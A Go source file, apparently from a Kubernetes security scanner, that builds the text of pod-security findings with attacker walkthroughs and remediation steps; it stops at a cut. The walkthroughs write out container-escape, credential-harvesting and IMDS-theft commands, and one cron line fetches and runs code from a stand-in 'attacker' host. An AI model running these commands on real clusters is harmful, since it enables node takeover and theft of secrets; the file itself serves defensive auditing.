// Content for pod-security findings. Each rule has a builder that takes runtime context (workload
// kind/namespace/name, container name, hostPath path) and returns an enriched ruleContent with
// scope-aware language, an attacker walkthrough, ordered remediation steps, and structured
// references / MITRE technique citations.
//
// Sources: Kubernetes Pod Security Standards, NSA/CISA Kubernetes Hardening Guide v1.2, MITRE
// ATT&CK Containers matrix, Microsoft Threat Matrix for Kubernetes, Bishop Fox Bad Pods, KubeHound,
// Aqua Security writeups, Quarkslab "HostPath: Love-Hate Relationship", The Grey Corner containerd
// research, Christophe Tafani-Dereeper "Stop worrying about allowPrivilegeEscalation".
package podsec

import (
	"fmt"
	"strings"

	"github.com/hardik/kubesplaining/internal/models"
)

// ruleContent bundles every enriched field a podsec rule emits.
type ruleContent struct {
	Title            string
	Scope            models.Scope
	Description      string
	Impact           string
	AttackScenario   []string
	Remediation      string
	RemediationSteps []string
	LearnMore        []models.Reference
	MitreTechniques  []models.MitreTechnique
}

// scopeForWorkload returns the per-workload scope. DaemonSets are flagged because their blast
// radius is "every node" — surface that in the Detail string so reviewers see it immediately.
func scopeForWorkload(kind, namespace, name string) models.Scope {
	level := models.ScopeWorkload
	detail := fmt.Sprintf("Workload `%s/%s/%s`", kind, namespace, name)
	if kind == "DaemonSet" {
		detail += " — runs on **every** node (per-node blast radius)"
	}
	if strings.HasPrefix(namespace, "kube-") {
		detail += " — control-plane namespace"
	}
	return models.Scope{Level: level, Detail: detail}
}

// MITRE technique objects shared across podsec rules.
var (
	mitreT1611     = models.MitreTechnique{ID: "T1611", Name: "Escape to Host", URL: "https://attack.mitre.org/techniques/T1611/"}
	mitreT1610     = models.MitreTechnique{ID: "T1610", Name: "Deploy Container", URL: "https://attack.mitre.org/techniques/T1610/"}
	mitreT1068     = models.MitreTechnique{ID: "T1068", Name: "Exploitation for Privilege Escalation", URL: "https://attack.mitre.org/techniques/T1068/"}
	mitreT1552_001 = models.MitreTechnique{ID: "T1552.001", Name: "Unsecured Credentials in Files", URL: "https://attack.mitre.org/techniques/T1552/001/"}
	mitreT1552_005 = models.MitreTechnique{ID: "T1552.005", Name: "Cloud Instance Metadata API", URL: "https://attack.mitre.org/techniques/T1552/005/"}
	mitreT1057     = models.MitreTechnique{ID: "T1057", Name: "Process Discovery", URL: "https://attack.mitre.org/techniques/T1057/"}
	mitreT1046     = models.MitreTechnique{ID: "T1046", Name: "Network Service Discovery", URL: "https://attack.mitre.org/techniques/T1046/"}
	mitreT1040     = models.MitreTechnique{ID: "T1040", Name: "Network Sniffing", URL: "https://attack.mitre.org/techniques/T1040/"}
	mitreT1543     = models.MitreTechnique{ID: "T1543", Name: "Create or Modify System Process", URL: "https://attack.mitre.org/techniques/T1543/"}
	mitreT1083     = models.MitreTechnique{ID: "T1083", Name: "File and Directory Discovery", URL: "https://attack.mitre.org/techniques/T1083/"}
	mitreT1548_001 = models.MitreTechnique{ID: "T1548.001", Name: "Setuid and Setgid", URL: "https://attack.mitre.org/techniques/T1548/001/"}
	mitreT1525     = models.MitreTechnique{ID: "T1525", Name: "Implant Internal Image", URL: "https://attack.mitre.org/techniques/T1525/"}
	mitreT1195_002 = models.MitreTechnique{ID: "T1195.002", Name: "Compromise Software Supply Chain", URL: "https://attack.mitre.org/techniques/T1195/002/"}
	mitreT1554     = models.MitreTechnique{ID: "T1554", Name: "Compromise Host Software Binary", URL: "https://attack.mitre.org/techniques/T1554/"}
	mitreT1078     = models.MitreTechnique{ID: "T1078", Name: "Valid Accounts", URL: "https://attack.mitre.org/techniques/T1078/"}
	mitreT1528     = models.MitreTechnique{ID: "T1528", Name: "Steal Application Access Token", URL: "https://attack.mitre.org/techniques/T1528/"}
	mitreT1005     = models.MitreTechnique{ID: "T1005", Name: "Data from Local System", URL: "https://attack.mitre.org/techniques/T1005/"}
)

var (
	refPSS             = models.Reference{Title: "Kubernetes — Pod Security Standards", URL: "https://kubernetes.io/docs/concepts/security/pod-security-standards/"}
	refPSA             = models.Reference{Title: "Kubernetes — Pod Security Admission", URL: "https://kubernetes.io/docs/concepts/security/pod-security-admission/"}
	refSecurityContext = models.Reference{Title: "Kubernetes — Configure a Security Context for a Pod or Container", URL: "https://kubernetes.io/docs/tasks/configure-pod-container/security-context/"}
	refNSAHardening    = models.Reference{Title: "NSA/CISA Kubernetes Hardening Guide v1.2 (PDF)", URL: "https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF"}
	refBadPods         = models.Reference{Title: "Bishop Fox — Bad Pods: Kubernetes Pod Privilege Escalation", URL: "https://bishopfox.com/blog/kubernetes-pod-privilege-escalation"}
)

func contentEscape001(kind, namespace, name, container string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Privileged container `%s` in `%s/%s/%s`", container, kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` is configured with `securityContext.privileged: true`. A privileged container retains every Linux capability (CAP_SYS_ADMIN, CAP_SYS_MODULE, CAP_NET_ADMIN, etc.), bypasses all Linux Security Module profiles (AppArmor/SELinux), runs without the default seccomp profile, and shares `/dev` with the host. From the kernel's perspective it is indistinguishable from a process running directly on the node.\n\n"+
			"This is the single most dangerous PodSpec setting: capability drops, read-only root filesystem, and `runAsNonRoot` are all neutralised because the container can simply remount, reload kernel modules, or call `setuid(0)`. The Pod Security Standards explicitly forbid privileged containers at both Baseline and Restricted levels.\n\n"+
			"Real-world breakout: an attacker with code execution loads a kernel module with `insmod` (CAP_SYS_MODULE), or uses `mknod` to recreate `/dev/sda1`, mounts the host root, and writes to `/root/.ssh/authorized_keys`. Public exploit tooling (`deepce`, `kdigger -ac`, `kubeletmein`) automates these in seconds.",
			container, kind, namespace, name),
		Impact: "Full root on the host node — read every Secret on the node, exfiltrate the kubelet client certificate, schedule pods anywhere, and pivot to other nodes.",
		AttackScenario: []string{
			"Attacker gains code execution inside the privileged pod (RCE, malicious image, SSRF→shell).",
			"They confirm the configuration with `kdigger dig admission` or `deepce.sh`.",
			"They mount the host filesystem: `mkdir /host && mount /dev/sda1 /host`.",
			"They steal kubelet credentials from `/host/var/lib/kubelet/pki/kubelet-client-current.pem` or write `/host/root/.ssh/authorized_keys`.",
			"With kubelet creds they list every Pod and Secret on the node, then escalate to cluster-admin via the cgroup-release-agent technique or `nsenter -t 1 -a`.",
		},
		Remediation: "Remove `privileged: true` and explicitly grant only the Linux capabilities the workload actually needs.",
		RemediationSteps: []string{
			"Audit why the container needs privileged — most apps do not. Trace which capability is actually required (often only `NET_BIND_SERVICE`).",
			"Replace `privileged: true` with `capabilities.drop: [ALL]` and an explicit `capabilities.add: [<NEEDED_CAP>]`. Add `allowPrivilegeEscalation: false`, `readOnlyRootFilesystem: true`, `runAsNonRoot: true`, and `seccompProfile.type: RuntimeDefault`.",
			"Enforce at admission time: label the namespace `pod-security.kubernetes.io/enforce: baseline` (or `restricted`) so future regressions are blocked.",
			fmt.Sprintf("Validate with `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.containers[*].securityContext.privileged}'` returning empty/false.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{refPSS, refPSA, refSecurityContext, refNSAHardening, refBadPods,
			{Title: "RBT Security — Breaking Out of Privileged Containers", URL: "https://www.rbtsec.com/blog/kubernetes-penetration-testing-part-three-breaking-out-with-privileged-containers/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1610, mitreT1068},
	}
}

func contentEscape002(kind, namespace, name string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Pod shares host PID namespace (`hostPID: true`) — `%s/%s/%s`", kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` sets `spec.hostPID: true`, joining the host's PID namespace. Every process on the node — kubelet, container runtime, other tenant workloads, sshd, cloud-init agents — is visible via `/proc` and addressable by PID from inside this pod.\n\n"+
			"The risk is twofold. First, information disclosure: `/proc/<pid>/environ`, `/proc/<pid>/cmdline`, and `/proc/<pid>/root/...` leak environment variables (which often contain database passwords, cloud credentials, and Kubernetes service-account tokens), CLI args, and arbitrary file contents from other containers' rootfs. Second, when combined with CAP_SYS_PTRACE or `privileged: true`, an attacker can `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash` and land directly in the host's mount namespace as root.\n\n"+
			"Bishop Fox's `bad-pods` library and `kdigger`'s `processes` bucket grep `/proc/*/environ` for `AWS_`, `KUBE_`, `DATABASE_URL`, and service-account JWTs. Even without extra capabilities, host-PID alone is enough to harvest cleartext credentials from neighboring pods on the same node — a classic noisy-neighbor escalation primitive (TeamTNT, Hildegard).",
			kind, namespace, name),
		Impact: "Read process arguments, environment variables, and `/proc/<pid>/root` of every other pod on the node; harvest service-account tokens and cloud credentials from neighbors.",
		AttackScenario: []string{
			"Gain code execution in the pod with `hostPID: true`.",
			"Enumerate processes: `ps -ef` shows host kubelet, runc, and sibling containers.",
			"Loot environments: `for p in /proc/[0-9]*/environ; do tr '\\0' '\\n' < $p; done | grep -iE 'token|secret|aws|key'`.",
			"Read other pods' service-account tokens via `cat /proc/<pid>/root/var/run/secrets/kubernetes.io/serviceaccount/token`.",
			"If CAP_SYS_PTRACE or privileged is also present, `nsenter -t 1 -a` to land in the host root namespace and persist via SSH key or systemd unit.",
		},
		Remediation: "Set `spec.hostPID: false` (or omit it — defaults to false).",
		RemediationSteps: []string{
			"Identify why hostPID was set; legitimate uses are limited to node-monitoring DaemonSets like node-exporter.",
			"Remove `hostPID: true` from the pod template (or set explicitly to `false`).",
			"Apply Pod Security Admission `baseline`: `kubectl label ns <ns> pod-security.kubernetes.io/enforce=baseline`.",
			fmt.Sprintf("Validate with `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.hostPID}'` returning empty or `false`.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{refPSS, refPSA, refBadPods, refNSAHardening,
			{Title: "CIS Kubernetes Benchmark 5.2.2 — Minimize containers sharing host PID", URL: "https://www.cisecurity.org/benchmark/kubernetes"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1552_001, mitreT1057},
	}
}

func contentEscape003(kind, namespace, name string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Pod shares host network (`hostNetwork: true`) — `%s/%s/%s`", kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` sets `spec.hostNetwork: true`. The container is no longer in a sandboxed network namespace — it sees the node's interfaces, listens on the node's IPs and ports, and reaches every loopback service the kubelet talks to.\n\n"+
			"The most dangerous consequence is that NetworkPolicies cannot apply. Cilium, Calico, and the upstream NetworkPolicy spec key off the pod's veth and labels — a hostNetwork pod has neither, so all egress filtering is silently bypassed. On managed Kubernetes (EKS/GKE/AKS) the workload can reach the cloud Instance Metadata Service at `169.254.169.254` even when the cluster has set IMDSv2 hop-count protection. The result is a one-step path from container RCE to AWS/Azure/GCP IAM credential theft.\n\n"+
			"The pod can also bind privileged ports the host already uses, redirect kube-proxy, sniff service traffic, or scan internal-only addresses such as `127.0.0.1:10250` (kubelet) which is otherwise unreachable from a normal pod.",
			kind, namespace, name),
		Impact: "Bypasses NetworkPolicy and IMDSv2 hop protection; container reaches cloud metadata, kubelet localhost, and any node-loopback service — pivots cluster compromise into cloud-account compromise.",
		AttackScenario: []string{
			"Gain code execution in the pod (web RCE, malicious image).",
			"Confirm hostNetwork: `ip addr` shows the node's primary interface, not a pod CIDR.",
			"Hit the IMDS: `curl -s http://169.254.169.254/latest/api/token -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'` then fetch `iam/security-credentials/<role>`.",
			"Use stolen IAM creds with `aws sts get-caller-identity` and pivot to S3/EKS API.",
			"Optional: probe `127.0.0.1:10250` (kubelet) — if anonymous auth, run `curl -k https://127.0.0.1:10250/pods` to enumerate every pod on the node and exec into any of them.",
		},
		Remediation: "Set `hostNetwork: false` (default) and route any node-level networking through a CNI-managed Service or NetworkPolicy-aware DaemonSet.",
		RemediationSteps: []string{
			"Audit if hostNetwork is required — typically only kube-proxy, CNI agents, or node-local DNS legitimately need it.",
			"Remove `hostNetwork: true`. If a host port is genuinely required, prefer a Service of type NodePort or an Ingress controller behind a NetworkPolicy.",
			"Enforce IMDSv2 with hop-limit = 1 on every node; apply an egress NetworkPolicy denying `169.254.169.254/32` for application namespaces.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.hostNetwork}'` is empty/false; `kubectl exec ... -- curl -m 2 http://169.254.169.254/` should fail.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{refPSS,
			{Title: "Datadog Security Labs — Attacking EKS cloud identities", URL: "https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/"},
			{Title: "Wiz — Lateral movement: from container to cloud takeover", URL: "https://www.wiz.io/blog/lateral-movement-risks-in-the-cloud-and-how-to-prevent-them-part-2-from-k8s-clust"},
			{Title: "Microsoft Threat Matrix — Access cloud resources", URL: "https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Access%20cloud%20resources/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1552_005, mitreT1046, mitreT1040},
	}
}

func contentEscape004(kind, namespace, name string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Pod shares host IPC (`hostIPC: true`) — `%s/%s/%s`", kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` sets `spec.hostIPC: true`, joining the host's IPC (Inter-Process Communication) namespace. The container can read and write the host's POSIX shared-memory segments (`/dev/shm`), SysV shared memory, message queues, and semaphore arrays.\n\n"+
			"The attack surface is data, not code execution. Many host-resident processes — caching layers, GPU compute (CUDA's `cuMemAlloc`), Redis with `unixsocket`, Postgres' shared buffers, even kernel-side IMA logs — store in-memory state in IPC segments under the assumption no untrusted process can address them. With `hostIPC: true` an attacker dumps every visible segment, harvests cached secrets, replays message queues, or corrupts semaphores to cause denial-of-service.\n\n"+
			"Bishop Fox's `bad-pods/hostipc` example uses `ipcs -m` to list shared-memory segments and `ipcs -p` to identify owning PIDs, then `cat /dev/shm/*` (or attaches via `shmat`) to extract their contents. hostIPC is forbidden by the Pod Security Standards Baseline level.",
			kind, namespace, name),
		Impact: "Read or modify shared memory and SysV IPC of every process on the node; leak in-memory secrets, GPU buffers, database caches; denial-of-service via semaphore corruption.",
		AttackScenario: []string{
			"Gain code execution in the pod with hostIPC enabled.",
			"Enumerate IPC: `ipcs -a` lists shared-memory IDs, message queues, and semaphores.",
			"Dump `/dev/shm`: `ls -la /dev/shm; for f in /dev/shm/*; do strings \"$f\" | grep -iE 'token|secret|key'; done`.",
			"Attach to a SysV segment with a small program (`shmat(shmid, 0, SHM_RDONLY)`) and exfiltrate.",
			"If a co-tenant runs an in-memory cache (Redis without disk persistence, an ML inference engine), extract model weights or session tokens still resident.",
		},
		Remediation: "Set `hostIPC: false` (default).",
		RemediationSteps: []string{
			"Confirm no legitimate IPC sharing requirement; very few application workloads need this — typically only NVIDIA GPU sharing or some HPC workloads.",
			"Remove `hostIPC: true` from the pod template.",
			"Where shared memory is a feature need (containers cooperating), use a single Pod with multiple containers and an `emptyDir { medium: Memory }` volume instead of host IPC.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.hostIPC}'` is empty/false.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{refPSS, refBadPods,
			{Title: "Bishop Fox — badPods/hostipc", URL: "https://github.com/BishopFox/badPods/blob/main/manifests/hostipc/README.md"},
			{Title: "Elastic Security — Kubernetes Pod Created With HostIPC", URL: "https://www.elastic.co/guide/en/security/8.19/kubernetes-pod-created-with-hostipc.html"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1552_001, mitreT1005},
	}
}

func contentEscape005(kind, namespace, name, volumeName string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Docker socket mounted into `%s/%s/%s` (volume `%s` → `/var/run/docker.sock`)", kind, namespace, name, volumeName),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` mounts the Docker UNIX socket `/var/run/docker.sock` from the node into the container (volume `%s`). The Docker daemon listens on this socket as root and exposes the entire Docker Engine API — including `POST /containers/create`, which lets any client launch a new container with arbitrary mounts, devices, capabilities, and host-namespace settings.\n\n"+
			"Mounting docker.sock is equivalent to giving the workload an unrestricted root shell on the node. There is no permission boundary inside the Docker API; \"read-only\" mount of the socket file does not help because the socket is a request channel, not a stored object — once you can `connect()` to it, you can issue any command. The OWASP Docker Security Cheat Sheet calls this the top-priority anti-pattern, and HackTricks documents the breakout as a one-liner.\n\n"+
			"From inside the container, install the Docker CLI (or use `curl --unix-socket`) and run `docker run -v /:/host --privileged --pid=host -it alpine chroot /host`. The new container mounts the host root, runs as host root, and can drop a backdoor into `/etc/cron.d/`, steal `/var/lib/kubelet/pki/`, or `nsenter -t 1 -a` to land on the host directly.",
			kind, namespace, name, volumeName),
		Impact: "Equivalent to root on the node — launch any container with any mount, mount the host filesystem, steal kubelet certs, and pivot to the entire cluster.",
		AttackScenario: []string{
			"Gain code execution in the pod with docker.sock mounted.",
			"Verify: `ls -la /var/run/docker.sock; curl --unix-socket /var/run/docker.sock http://localhost/version`.",
			"Spawn a privileged container that mounts host root: `docker run -it --rm -v /:/host alpine chroot /host /bin/sh`.",
			"Read kubelet client cert: `cat /host/var/lib/kubelet/pki/kubelet-client-current.pem` and use it to talk to the apiserver as `system:node:<nodeName>`.",
			"Persist by writing an SSH key to `/host/root/.ssh/authorized_keys` or installing a systemd service.",
		},
		Remediation: "Remove the docker.sock hostPath mount; do not run sibling-container patterns on Kubernetes.",
		RemediationSteps: []string{
			"Identify why the workload talks to Docker — usually a CI runner, log shipper, or build system. Replace with a Kubernetes-native alternative: Buildah/Kaniko/Buildkit-rootless for builds, the Kubernetes API for pod orchestration, fluent-bit's tail input for logs.",
			"Remove the `hostPath: /var/run/docker.sock` volume and corresponding `volumeMount`.",
			"Apply Pod Security Admission `baseline` to the namespace (forbids hostPath volumes) and/or use a Kyverno/OPA policy that explicitly denies this path.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.volumes}' | jq` should not contain `/var/run/docker.sock`.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{
			{Title: "OWASP Docker Security Cheat Sheet — Rule #1", URL: "https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"},
			{Title: "HackTricks — Abusing Docker Socket for Privilege Escalation", URL: "https://hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html"},
			{Title: "Quarkslab — Why exposing the Docker socket is a really bad idea", URL: "https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html"},
			refPSS,
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1610, mitreT1068},
	}
}

func contentContainerdSocket001(kind, namespace, name, volumeName string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Containerd socket mounted into `%s/%s/%s` (volume `%s`)", kind, namespace, name, volumeName),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` mounts containerd's UNIX socket (`/run/containerd/containerd.sock` or `/var/run/containerd/containerd.sock`) into the container via volume `%s`. Containerd runs as root and is the runtime the kubelet uses to start every pod on the node — if you can talk to its API, you can create, modify, or exec into any container on the host, including kube-system control-plane pods.\n\n"+
			"This is the modern equivalent of the docker.sock anti-pattern. Since Kubernetes 1.24 removed dockershim, most clusters use containerd or CRI-O directly; the same breakout primitives apply but the tooling differs (`ctr`, `crictl`). Kubernetes places its containers under containerd namespace `k8s.io` — `ctr -n k8s.io containers list` enumerates every pod on the node.\n\n"+
			"The Grey Corner's containerd-socket-exploitation series documents the one-liner: install or copy the `ctr` binary, then run `ctr --address /run/containerd/containerd.sock -n k8s.io run --rm --mount type=bind,src=/,dst=/host,options=rbind:rw --privileged docker.io/library/alpine:latest pwn /bin/sh`. The result is a privileged container with `/` mounted at `/host`. From there an attacker reads the kubelet client cert, dumps every pod's secrets, or `task exec`s a reverse shell into the apiserver static pod on a control-plane node.",
			kind, namespace, name, volumeName),
		Impact: "Root on the node and arbitrary code execution inside any container on the node, including kube-system static pods. Equivalent to compromising the kubelet itself.",
		AttackScenario: []string{
			"Code execution in the pod with containerd.sock mounted.",
			"`ls -la /run/containerd/containerd.sock; ctr --address /run/containerd/containerd.sock version`.",
			"List target containers: `ctr -n k8s.io containers list` — note kube-apiserver, etcd, or any victim app.",
			"Spawn a privileged escape container: `ctr -n k8s.io run --rm --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/alpine:latest x /bin/sh -c 'chroot /host'`.",
			"From host, harvest `/var/lib/kubelet/pki/kubelet-client-current.pem` and pivot to the API server.",
		},
		Remediation: "Remove the containerd-socket hostPath mount; use the Kubernetes API or CRI-aware tools instead.",
		RemediationSteps: []string{
			"Determine why the workload needs CRI access. Legitimate use is rare — typically only specific node-agent observability tools. Replace with a Kubernetes-API-driven alternative.",
			"Remove the hostPath volume and volumeMount targeting `/run/containerd/containerd.sock` (and aliases).",
			"For monitoring use cases, use the kubelet's `/metrics/cadvisor` endpoint behind an RBAC-scoped ServiceAccount, not raw socket access.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o yaml | grep -i containerd` returns no socket mount.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{
			{Title: "The Grey Corner — containerd socket exploitation part 1", URL: "https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html"},
			{Title: "containerd ctr(8) man page", URL: "https://manpages.debian.org/testing/containerd/ctr.8.en.html"},
			refPSS,
			{Title: "Microsoft Threat Matrix — Container service account", URL: "https://microsoft.github.io/Threat-Matrix-for-Kubernetes/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1610, mitreT1068},
	}
}

func contentEscape006(kind, namespace, name, volumeName string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Root filesystem (`/`) mounted from host into `%s/%s/%s`", kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` mounts the host's root filesystem (`hostPath: /`) inside the container via volume `%s`. Combined with the container's UID (typically root), this exposes the entire node filesystem — kubelet credentials, every other pod's mounted secrets, the container runtime state, and on control-plane nodes the static-pod manifests under `/etc/kubernetes/manifests`.\n\n"+
			"Mounting `/` is one of the few configurations that, by itself, guarantees host compromise without requiring a CVE, kernel exploit, or even the `privileged` flag. The kubelet stores per-pod secrets at `/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~secret/<name>/...` in cleartext (tmpfs); a read-only host-root mount is enough to copy them all out. A read-write mount turns this into trivial persistence: write to `/etc/cron.d/`, modify `/etc/sudoers`, drop a shared-object into `/etc/ld.so.preload`, or — on a control-plane node — drop a malicious manifest into `/etc/kubernetes/manifests/` which the kubelet then runs as a static pod with full privileges.\n\n"+
			"A single command sequence — `chroot /host`, `cat /host/var/lib/kubelet/pki/kubelet-client-current.pem`, then `kubectl --kubeconfig=<crafted> get secrets -A` — yields full secret enumeration on every pod on the node. Public exploit aids (`kubeletmein`, `peirates`) automate the chain.",
			kind, namespace, name, volumeName),
		Impact: "Read every secret on the node; write to host cron, SSH, kubelet PKI, or static-pod manifests; persistence and pivot to cluster-admin.",
		AttackScenario: []string{
			"RCE in the pod that mounts `/` at `/host`.",
			"Steal kubelet creds: `cp /host/var/lib/kubelet/pki/kubelet-client-current.pem /tmp/k.pem`.",
			"Enumerate other pods' secrets: `find /host/var/lib/kubelet/pods -path '*/kubernetes.io~secret/*' -type f -exec cat {} \\;`.",
			"Persist: `echo '* * * * * root curl http://attacker/x|sh' > /host/etc/cron.d/k8s` (RW) or, on a control-plane node, `cp evil-pod.yaml /host/etc/kubernetes/manifests/`.",
			"With kubelet creds, run `kubectl --client-certificate=/tmp/k.pem ...` and harvest cluster secrets.",
		},
		Remediation: "Never mount `/` from the node. Use specific subpaths or projected volumes if absolutely required.",
		RemediationSteps: []string{
			"Identify the actual file or directory the workload needs and replace the mount with the narrowest possible path (and `readOnly: true`).",
			"Where possible, replace hostPath entirely with a CSI-backed volume, ConfigMap, Secret, or projected volume.",
			"Apply Pod Security Admission `baseline` to the namespace (forbids hostPath). For unavoidable cases, allowlist via Kyverno/Gatekeeper that pins the path and `readOnly: true`.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.volumes[*].hostPath.path}'` does not contain `/`.", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{
			{Title: "Kubernetes — Volumes (hostPath)", URL: "https://kubernetes.io/docs/concepts/storage/volumes/#hostpath"},
			refPSS,
			{Title: "Quarkslab — Kubernetes and HostPath: a Love-Hate Relationship", URL: "https://blog.quarkslab.com/kubernetes-and-hostpath-a-love-hate-relationship.html"},
			refBadPods,
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1552_001, mitreT1543},
	}
}

func contentEscape008(kind, namespace, name, volumeName string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("`/var/log` mounted from host into `%s/%s/%s` — log-symlink escape primitive", kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` mounts `/var/log` from the host via volume `%s`. This directory is the canonical container-log staging area: the kubelet writes per-pod logs into `/var/log/pods/<ns>_<pod>_<uid>/<container>/0.log` as symlinks pointing to the runtime's actual log files.\n\n"+
			"The exploit is that `kubectl logs` causes the kubelet (running as root) to read those symlinks. If a pod can write into the host's `/var/log` (because it has the directory mounted), it can replace its own `0.log` symlink with one pointing to ANY file on the node, e.g. `/etc/shadow` or `/var/lib/kubelet/pki/kubelet-client-current.pem`. The next `kubectl logs <pod>` returns the contents of that file as if it were the container's stdout. This is the well-known `/var/log` symlink escape (Aqua Security, KubeHound `CE_VAR_LOG_SYMLINK`, CVE-2017-1002101, CVE-2021-25741).\n\n"+
			"The pattern is very common in misconfigured log shippers (Fluentd, Filebeat, Promtail). On multi-tenant clusters where any user can `kubectl logs` against pods they own, this is a universal arbitrary-file-read primitive.",
			kind, namespace, name, volumeName),
		Impact: "Arbitrary file read on the host node as root via the kubelet's log-resolving behavior; compromise kubelet PKI, /etc/shadow, etcd snapshots, every pod's mounted secrets.",
		AttackScenario: []string{
			"RCE in a pod that has `hostPath: /var/log` mounted (RW).",
			"Find own pod's log-symlink directory: `ls -la /var/log/pods/`.",
			"Replace `0.log` symlink: `ln -sf /etc/shadow /var/log/pods/<ns>_<pod>_<uid>/<container>/0.log`.",
			"Trigger the read: `kubectl logs <pod> -c <container>` returns `/etc/shadow`.",
			"Repeat for kubelet PKI and pivot via direct apiserver auth as `system:node:<nodeName>`.",
		},
		Remediation: "Do not mount `/var/log` (or its subdirectories) from the host into application pods; use the kubelet logs API or a log-aggregator sidecar pattern.",
		RemediationSteps: []string{
			"For log-shipper DaemonSets that genuinely need host logs, switch to read-only mount AND restrict to `/var/log/containers` and `/var/log/pods` only (not the parent `/var/log`).",
			"Configure the log shipper to refuse following symlinks (e.g. Fluent Bit `Path_Key`) and run as a non-root UID.",
			"For application pods, route logs to stdout/stderr only — Kubernetes captures these without any hostPath. Drop the hostPath mount.",
			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o yaml | grep -A2 hostPath` does not contain `/var/log` (or only narrow read-only sub-path).", strings.ToLower(kind), name, namespace),
		},
		LearnMore: []models.Reference{
			{Title: "Aqua Security — Kubernetes Pod Escape Using Log Mounts", URL: "https://www.aquasec.com/blog/kubernetes-security-pod-escape-log-mounts/"},
			{Title: "KubeHound — CE_VAR_LOG_SYMLINK", URL: "https://kubehound.io/reference/attacks/CE_VAR_LOG_SYMLINK/"},
			{Title: "CVE-2021-25741 — Symlink exchange host filesystem access", URL: "https://github.com/kubernetes/kubernetes/issues/104980"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1552_001, mitreT1083},
	}
}

func contentHostPath001(kind, namespace, name, volumeName, path string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("HostPath mount `%s` in `%s/%s/%s`", path, kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Workload `%s/%s/%s` mounts host path `%s` via volume `%s`. Generic hostPath usage breaks the container abstraction: the pod is now coupled to a specific node's filesystem layout, bypasses CSI quota/encryption/snapshotting, and creates a path-dependent attack surface that varies with the path mounted.\n\n"+
			"Even \"benign\" paths can be dangerous. `/proc` exposes the host's process tree (modify `/proc/sys/kernel/core_pattern` for root via crash). `/sys` lets a writable mount enable cgroup-release-agent escapes (CVE-2022-0492). `/dev` shared with the host gives raw block-device access. `/etc/kubernetes` contains kubelet config and PKI on control-plane nodes.\n\n"+
			"Even a mount of `/etc` (read-only) leaks `/etc/shadow`, ssh `host_keys`, kubeadm config, and CNI tokens. Kubernetes Pod Security Standards forbid hostPath at Baseline because there is no safe whitelist.",
			kind, namespace, name, path, volumeName),
		Impact: "Variable but always elevated risk: at minimum exposes node-specific files; commonly leaks credentials or enables privilege escalation depending on the path.",
		AttackScenario: []string{
